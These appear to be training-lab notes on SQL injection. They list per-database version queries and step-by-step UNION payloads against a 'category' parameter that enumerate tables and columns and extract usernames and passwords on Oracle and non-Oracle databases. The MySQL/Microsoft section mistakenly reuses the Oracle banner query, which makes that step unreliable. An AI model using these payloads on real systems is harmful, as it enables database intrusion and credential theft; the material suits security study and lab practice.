# Examining the database in SQL injection attacks

Examining database
| Database type | Query |
| ------------- | ------| 
|Microsoft 		|	SELECT @@version |
|Oracle 		|	SELECT * FROM v$version |
|PostgreSQL 	| 	SELECT version() |
|MySQL 			|	SELECT @@version |

## Lab #1: SQL injection attack, querying the database type and version on Oracle

Steps: 

1. Determine the number of column
```
category=Pets' ORDER BY 1,2 --
```

2. Determine the columns data type
```
category=Pets' UNION SELECT 'a','b' FROM DUAL --
```

3. Retrieve Oracle banner
```
category=Pets' UNION SELECT banner, null FROM v$version --
```
```
UNION SELECT * FROM v$version where banner LIKE 'oracle%'--

```

## SQL injection attack, querying the database type and version on MySQL and Microsoft


Steps

1. Determine the number of column
```
category=Pets' ORDER BY 1,2 #
```

2. Determine the columns data type
```
category=Pets' UNION SELECT 'a','b' #
```

3. Retrieve Oracle database banner
```
category=Pets' UNION SELECT banner, null FROM v$version --
```

`#` = %23

## Lab #2: SQL injection attack, listing the database contents on non-Oracle databases

Steps:

1. Determine the number of columns and column data type
```
category=Pets' order by 1, 2 --
category=Pets' union select 'a', 'a' --
```

2. Find all table name contains '%user%' | `%` = %25
```
category=Pets' union select table_name, 'a' from information_schema.tables where table_name like '%user%'--
```

3. List the table columns
```
category=Pets' union select table_name, column_name from information_schema.columns where table_name='pg_user' --
category=Pets' union select table_name, column_name from information_schema.columns where table_name='users_rfankd' -- 
```

4. Retrieve the table contents

```
category=Pets' union select username_grhpij, password_rhddiy from users_rfankd -- 

category=Pets' union select username_grhpij || ':' || password_rhddiy, null from users_rfankd -- 
```

## Lab #3: SQL injection attack, listing the database contents on Oracle

steps:
1. Determine the number of columns and columns data type
```
' ORDER BY 1,2 
' UNION SELECT 'a', 'a' FROM DUAL --
```

2. Examine the database type.
```
' UNION SELECT banner ,NULL FROM v$version --
```

3. Find all table contains 'U%' | `%` = %25
```
' UNION SELECT table_name,'a' FROM all_tables WHERE table_name like 'U%25' --
```

4. List the table columns
```
' UNION SELECT table_name, column_name FROM all_tab_columns WHERE table_name = 'USERS_WNFXKC'
``` 

5. Retrieve the table contents
```
' UNION SELECT USERNAME_ZATYRE, PASSWORD_FIACJD FROM USERS_WNFXKC --
```
